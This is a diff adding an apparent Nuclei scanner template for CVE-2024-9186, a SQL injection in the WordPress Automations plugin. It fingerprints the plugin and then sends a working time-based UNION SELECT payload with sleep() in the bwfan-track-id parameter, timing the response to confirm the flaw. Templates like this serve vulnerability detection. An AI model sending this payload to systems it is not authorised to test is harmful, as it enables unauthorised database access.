@@ -1,0 +1,41 @@
+id: wordpress-plugin-automations-sqli-cve-2024-9186
+info:
+  name: WordPress Plugin Automations SQL Injection (CVE-2024-9186)
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection,CVE-2024-9186
+  description: |
+    The WordPress Plugin Automations plugin contains a SQL injection vulnerability that can be exploited by an attacker.
+
+variables:
+  t1: '{{rand_int(4,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "wp-content/plugins/wp-marketing-automations/"
+        part: body
+  
+  - raw:
+      - |
+        GET /?bwfan-track-id=test%27%20UNION%20SELECT%201%2C1%2C%27%27%2CNOW()%2CNOW()%2C1%2C%27%27%2C1%2C1%2C1%2C1%2C1%2C1%2C1%2C%27%27%2CNOW()%2C%27%27%2CNOW()%2C1%2C1%2Csleep({{t1}})%23&bwfan-track-action=click HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "api.w.org"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
